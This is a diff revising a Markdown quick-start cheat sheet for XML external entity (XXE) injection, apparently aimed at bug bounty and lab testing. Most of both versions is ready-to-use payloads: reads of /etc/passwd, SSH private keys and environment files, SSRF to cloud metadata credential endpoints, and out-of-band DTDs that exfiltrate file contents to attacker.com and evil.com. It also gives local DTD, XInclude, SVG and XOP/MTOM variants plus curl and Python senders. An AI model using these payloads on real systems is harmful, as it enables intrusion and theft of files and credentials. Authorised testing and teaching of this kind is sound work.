@@ -1,342 +1,193 @@
-# XXE Injection - Quick Start Guide
+# XXE Injection — Quick Start
 
-## 60-Second XXE Check
+## 60-second smoke test
 
 ```bash
-# 1. Identify XML endpoint
-# 2. Inject basic payload
-# 3. Check response
-
-# Basic test payload:
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
-<root>&xxe;</root>
+curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
+<root>&test;</root>' http://target/api/xml
 ```
 
----
+If `/etc/passwd` content appears in the response → XXE vulnerable.
 
-## Common Payloads Cheat Sheet
-
-### File Retrieval
+## File retrieval
 
 **Linux:**
 ```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
 ```
 
 **Windows:**
 ```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts"> ]>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/users/<USER>/.ssh/id_rsa"> ]>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/users/<USER>/desktop/user.txt"> ]>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
 ```
 
-### SSRF
-
-**AWS Metadata:**
+**Read source code:**
 ```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">]>
 ```
 
-**Internal Services:**
+If special chars (`<`, `&`) break parsing, use base64 wrapper:
 ```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/admin"> ]>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1/config"> ]>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">]>
 ```
 
-### Blind XXE
+## SSRF via XXE
 
-**Out-of-Band:**
 ```xml
-<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://internal-host:8080/admin">]>
+<root>&xxe;</root>
 ```
 
-**Data Exfiltration (external DTD):**
+Cloud metadata:
 ```xml
-<!-- Main payload -->
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
-
-<!-- evil.dtd -->
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
-%eval;
-%exfil;
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
 ```
 
-**Error-Based (external DTD):**
-```xml
-<!-- Main payload -->
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/error.dtd"> %xxe;]>
+## Blind XXE (out-of-band exfil)
 
-<!-- error.dtd -->
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
-%eval;
-%exfil;
+Host on attacker server (`evil.com`):
+
+```xml
+<!-- Malicious DTD: evil.dtd -->
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://evil.com/?d=%data;'>">
+%param1;
 ```
 
-### XInclude
-
+Trigger payload:
 ```xml
-<foo xmlns:xi="http://www.w3.org/2001/XInclude">
-<xi:include parse="text" href="file:///etc/passwd"/>
-</foo>
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">
+  %remote;
+  %exfil;
+]>
+<root>1</root>
 ```
 
-### SVG Upload
+Receive `/etc/passwd` content as URL parameter at evil.com.
+
+## XInclude (when XXE filtered but XInclude allowed)
 
 ```xml
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</root>
+```
+
+## SVG upload
+
+When app accepts image uploads and processes SVG:
+
+```xml
 <svg xmlns="http://www.w3.org/2000/svg">
-<text x="0" y="16">&xxe;</text>
+  <text>&xxe;</text>
+  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 </svg>
 ```
 
-### Local DTD Repurposing
+## Local DTD repurposing
+
+When network egress blocked, abuse local DTDs to leak data via error message:
 
 ```xml
+<?xml version="1.0"?>
 <!DOCTYPE message [
-<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
-<!ENTITY % ISOamso '
-<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
-<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
-&#x25;eval;
-&#x25;error;
-'>
-%local_dtd;
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamso 'AAA)>
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+    <!ELEMENT aa (bb'>
+  %local_dtd;
 ]>
-<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+<message>1</message>
 ```
 
----
+Common local DTDs:
+- `/usr/share/yelp/dtd/docbookx.dtd`
+- `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`
+- `C:\Windows\System32\wbem\xml\cim20.dtd`
 
-## Burp Suite Quick Workflow
+## XOP/MTOM SSRF (SOAP services)
 
-### Setup (30 seconds)
+SOAP endpoints with XOP attachment support:
 
-1. **Proxy:** Ensure listener active (127.0.0.1:8080)
-2. **Browser:** Configure proxy settings
-3. **Collaborator:** Burp → Collaborator client → Copy to clipboard
+```xml
+POST /soap HTTP/1.1
+Content-Type: multipart/related; type="application/xop+xml"; boundary=BOUNDARY
 
-### Testing (2 minutes)
+--BOUNDARY
+Content-Type: application/xop+xml
 
-1. **Identify:** Proxy → HTTP history → Filter: XML
-2. **Test:** Right-click request → Send to Repeater
-3. **Inject:** Add DOCTYPE + entity
-4. **Verify:** Check response or Collaborator
-
-### Automation (Burp Pro)
-
-1. **Scan:** Right-click target → "Scan"
-2. **Wait:** Scanner detects XXE automatically
-3. **Review:** Dashboard → Issues → XML External Entity
-
----
-
-## Detection Checklist
-
-**Quick checks:**
-
-- [ ] Application accepts XML input
-- [ ] `Content-Type: application/xml` or `text/xml`
-- [ ] SOAP web service
-- [ ] File upload accepts SVG/DOCX/XML
-- [ ] Import/export functionality with XML
-- [ ] API endpoints with XML bodies
-- [ ] RSS/Atom feed parsing
-
-**Test each with:**
-1. Basic file read payload
-2. Blind XXE with Collaborator
-3. XInclude (if can't control DOCTYPE)
-4. File upload (SVG) if applicable
-
----
-
-## Common Mistakes to Avoid
-
-| Wrong | Correct |
-|---------|-----------|
-| `file://etc/passwd` | `file:///etc/passwd` (3 slashes) |
-| `&xxe` (no semicolon) | `&xxe;` |
-| Using `%xxe;` in XML content | `%xxe;` only in DTD, `&xxe;` in content |
-| Forgetting DOCTYPE | Must define entity in DOCTYPE first |
-| Not polling Collaborator | Click "Poll now" to see interactions |
-
----
-
-## When Each Technique Works
-
-```
-Direct output visible?
-YES → Basic XXE (file read, SSRF)
-
-NO → Blind XXE ↓
-
-Outbound connections allowed?
-YES → Out-of-Band (Collaborator)
-
-NO → Error-based ↓
-
-External DTD loading allowed?
-YES → Error-based with external DTD
-
-NO → Local DTD repurposing
-
-Special cases:
-├─ Can't control DOCTYPE? → XInclude
-└─ File upload? → SVG/DOCX XXE
+<soap:Envelope ...>
+  <soap:Body>
+    <data><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
+                       href="http://internal-host/admin"/></data>
+  </soap:Body>
+</soap:Envelope>
+--BOUNDARY
 ```
 
----
+The `xop:Include href` triggers a server-side fetch — SSRF.
 
-## Quick Command Reference
-
-### Test with curl
+## Burp / cURL workflow
 
 ```bash
-# Basic XXE test
-curl -X POST https://target.com/api \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
-
-# Blind XXE test
-curl -X POST https://target.com/api \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><root>&xxe;</root>'
+# Capture XML POST in Burp
+# Repeater → modify body to inject DOCTYPE/ENTITY
+# Send → check response for file content
 ```
 
-### Python XXE tester
-
-```python
-import requests
-
-payload = '''<?xml version="1.0"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
-<root>&xxe;</root>'''
-
-response = requests.post(
-    'https://target.com/api',
-    headers={'Content-Type': 'application/xml'},
-    data=payload
-)
-
-print(response.text)
-```
-
----
-
-## 5-Minute Bug Bounty Workflow
-
-**Step 1: Identify (30 sec)**
-- Find XML endpoints
-- Check file uploads (SVG)
-- Look for SOAP services
-
-**Step 2: Test Basic (1 min)**
-```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
-```
-
-**Step 3: Test Blind (1 min)**
-```xml
-<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLABORATOR"> %xxe; ]>
-```
-
-**Step 4: Try XInclude (1 min)**
-```xml
-<foo xmlns:xi="http://www.w3.org/2001/XInclude">
-<xi:include parse="text" href="file:///etc/passwd"/>
-</foo>
-```
-
-**Step 5: Document & Report (1.5 min)**
-- Screenshot of `/etc/passwd` or Collaborator interaction
-- Describe impact (file read, SSRF, etc.)
-- Provide remediation advice
-- Submit report
-
----
-
-**Quick Start Version:** 1.0
-**Last Updated:** 2026-01-09
-**For:** Rapid XXE testing and lab completion
-
-## High-Value XXE Targets
-
-**Feature types most likely to be vulnerable:**
-- Admin panels with XML import
-- File upload with image processing (SVG, DOCX)
-- API endpoints with SOAP/XML-RPC
-- Document processing features
-- Email/calendar import (vCard, iCal)
-- RSS/Atom feed parsing
-
-## Top 10 XXE Testing Tips
-
-1. Always test blind XXE — most XXE in the wild is blind
-2. Start simple — basic payload first, then complex
-3. Check file uploads — SVG/DOCX often overlooked
-4. Test parameter entities — bypasses some entity restrictions
-5. Look for SOAP services — commonly vulnerable
-6. Try XInclude — works when DOCTYPE control is limited
-7. Read small files first — `/etc/hostname` before `/etc/passwd`
-8. Monitor errors — error messages leak file content
-9. Test all XML-like Content-Types — not just `application/xml`
-10. Document everything — reproduction steps are critical for reports
-
-## XOP/MTOM SSRF (SOAP Services)
-
-When traditional XXE (DTD entities) is blocked, SOAP services using MTOM/XOP may still be exploitable. The `xop:Include` element triggers a server-side HTTP fetch during XML deserialization — independent of DTD processing.
-
-**Detection:**
-- Look for `?wsdl` endpoints, `Content-Type: multipart/related`, Jetty/CXF/Axis2 server headers
-- Java SOAP stacks (Apache CXF, Axis2, Metro) are primary targets
-
-**Why it works:** CXF and similar frameworks disable DTD/external entities but still process XOP binary-optimized attachments. The `href` attribute in `xop:Include` supports `http://`, `https://`, and `file://` protocols.
-
-**Payload template (MTOM multipart request):**
+Curl one-liner:
 ```bash
-curl -X POST "http://target/ws/endpoint" \
-  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<root>"; boundary="----=_Part"' \
-  -d '------=_Part
-Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
-Content-ID: <root>
-
-<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
-<soap:Body><ns:operation xmlns:ns="http://target/ns">
-<arg><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
-  href="file:///etc/passwd"/></arg>
-</ns:operation></soap:Body></soap:Envelope>
-------=_Part--'
+curl -X POST -H "Content-Type: application/xml" -d @payload.xml http://target/api
 ```
 
-- Response contains the fetched content base64-encoded in the SOAP response field
-- For internal SSRF: use `href="http://169.254.169.254/latest/meta-data/"`
-- Chain: SSRF file read (`/proc/self/environ`, `.env`, config files) -> leaked credentials -> further exploitation
-- **Reference:** CVE-2022-46364 (Apache CXF < 3.5.5)
+## Detection checklist
 
----
+- [ ] XML accepted at any endpoint?
+- [ ] Verbose XML errors leaked?
+- [ ] DOCTYPE / ENTITY parsed?
+- [ ] External entities resolved?
+- [ ] Network egress allowed (for OAST)?
+- [ ] SVG / DOCX / XLSX / SOAP / XML-RPC accepted?
+- [ ] WSDL / XJC / SAX / DOM4J in source?
 
-## Troubleshooting
+## When each works
 
-**No response / output missing:**
-- Try placing the entity reference in EVERY XML element — not all fields are reflected in the response
-- On Windows, prioritize SSH keys: `file:///c:/users/<user>/.ssh/id_rsa`
-- Try blind XXE with an OOB callback
-- Check error messages for indirect disclosure
-- Try XInclude instead of DOCTYPE approach
+| Technique | Use when |
+|---|---|
+| File retrieval | XXE allowed, output reflected |
+| SSRF | Network egress allowed, no need for output |
+| Blind | Output not reflected, network egress allowed |
+| Local DTD | XXE allowed, NO network egress |
+| XInclude | DOCTYPE blocked but XInclude works |
+| SVG | Image upload feature processing SVG server-side |
+| XOP/MTOM | SOAP service supports MTOM attachments |
 
-**Special characters breaking payload:**
-- Use PHP filter: `php://filter/convert.base64-encode/resource=/etc/passwd`
-- Target simpler files: `/etc/hostname`
+## High-value targets
 
-**Parser restrictions (entities blocked):**
-- Try different entity types (general vs parameter)
-- Use XInclude
-- Test local DTD repurposing
+- SOAP / WSDL endpoints (`/soap`, `/services`).
+- DOCX / ODT / XLSX upload (zip-with-xml).
+- SVG upload (especially with rendering / preview).
+- XML-RPC endpoints (`xmlrpc.php` for WordPress).
+- Office Web Apps / collaborative editors.
+- Salesforce / SAP / Java EE apps (heavy XML).
+
+## Tools
+
+- Burp Suite (manual).
+- XXEinjector (Ruby): https://github.com/enjoiz/XXEinjector
+- xxer.py (Python).
+- ngrok / Burp Collaborator for blind XXE.
+
+## References
+
+- OWASP XXE Prevention Cheat Sheet.
+- CWE-611: Improper Restriction of XML External Entity.
+- PortSwigger XXE labs: https://portswigger.net/web-security/xxe
